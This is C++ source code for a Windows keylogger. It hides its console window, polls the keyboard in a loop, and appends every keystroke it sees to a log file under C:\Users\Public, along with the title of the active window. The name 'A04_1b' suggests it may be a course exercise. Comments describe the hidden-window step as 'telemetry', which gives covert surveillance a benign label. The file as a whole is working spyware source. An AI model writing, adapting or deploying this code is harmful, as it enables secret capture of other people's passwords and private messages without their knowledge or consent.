#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

#pragma comment(lib, "User32.lib")

using namespace std;

// Forward Declaration
string GetActiveWindowTitle();

void LOG(string input)
{
    fstream LogFile;
    LogFile.open("C:\\Users\\Public\\A04_1b_polling_keylog.txt", fstream::app);
    if (LogFile.is_open())
    {
        LogFile << input;
        LogFile.close();
    }
}

bool SpecialKeys(int S_Key)
{
    switch (S_Key)
    {
    case VK_SPACE:
        LOG(" ");
        return true;
    case VK_RETURN:
        LOG("\n");
        return true;
    case VK_OEM_PERIOD:
        LOG(".");
        return true;
    case VK_OEM_MINUS:
        LOG("-");
        return true;
    case VK_SHIFT:
        LOG("#SHIFT#");
        return true;
    case VK_BACK:
        LOG("[BACKSPACE]");
        return true;
    case VK_RBUTTON:
        LOG("#R_CLICK#");
        return true;
    case VK_CAPITAL:
        LOG("#CAPS_LOCK#");
        return true;
    case VK_TAB:
        LOG("#TAB#");
        return true;
    case VK_UP:
        LOG("#UP_ARROW_KEY#");
        return true;
    case VK_DOWN:
        LOG("#DOWN_ARROW_KEY#");
        return true;
    case VK_LEFT:
        LOG("#LEFT_ARROW_KEY#");
        return true;
    case VK_RIGHT:
        LOG("#RIGHT_ARROW_KEY#");
        return true;
    case VK_CONTROL:
        LOG("#CONTROL#");
        return true;
    case VK_MENU:
        LOG("#ALT#");
        return true;
    default:
        return false;
    }
}

string GetActiveWindowTitle()
{
    char windowTitle[256];
    // Corrected to use native HWND definition
    HWND hwnd = GetForegroundWindow();
    if (hwnd != NULL)
    {
        int length = GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
        if (length > 0)
        {
            return string(windowTitle);
        }
    }
    return "Unknown Window";
}

int main()
{
    // Hide native prompt frame during baseline telemetry phase
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    string currentWindow = "";

    while (true)
    {
        Sleep(10);

        string activeWindow = GetActiveWindowTitle();

        // Trace window boundary focus shifting
        if (activeWindow != currentWindow)
        {
            currentWindow = activeWindow;
            LOG("\n\n### Window: " + currentWindow + " ###\n");
        }

        for (int KEY = 8; KEY <= 190; KEY++)
        {
            if (GetAsyncKeyState(KEY) == -32767)
            {
                if (SpecialKeys(KEY) == false)
                {
                    if ((KEY >= 'A' && KEY <= 'Z') || (KEY >= '0' && KEY <= '9'))
                    {
                        bool isShift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                        bool isCaps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

                        char outChar = char(KEY);
                        if (!(isShift ^ isCaps) && (KEY >= 'A' && KEY <= 'Z'))
                        {
                            outChar = tolower(outChar);
                        }

                        string outputStr(1, outChar);
                        LOG(outputStr);
                    }
                }
            }
        }
    }

    return 0;
}